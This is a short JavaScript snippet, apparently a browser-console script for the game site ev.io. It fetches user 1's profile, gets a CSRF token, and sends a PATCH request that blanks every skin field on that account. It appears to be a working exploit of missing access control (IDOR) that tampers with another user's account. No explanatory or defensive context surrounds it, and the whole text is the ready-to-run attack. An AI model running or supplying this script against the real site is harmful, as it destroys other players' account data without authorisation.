(id => {
 id = "https://ev.io/user/" + id + "?_format=json";
 fetch(id).then(e => e.json()).then(e => {
  let _e = {};
  for (const key in e) {
   if (key.endsWith("_skin")) _e[key] = [];
  };
  fetch("https://ev.io/session/token").then(e => e.text()).then(token => {
   const xhr = new XMLHttpRequest();
   xhr.open("PATCH", id); 
   xhr.setRequestHeader("Accept", "application/json");
   xhr.setRequestHeader("Content-Type", "application/json");
   xhr.setRequestHeader("x-csrf-token", token);
   xhr.send(JSON.stringify(_e));
  });
 });
})(1);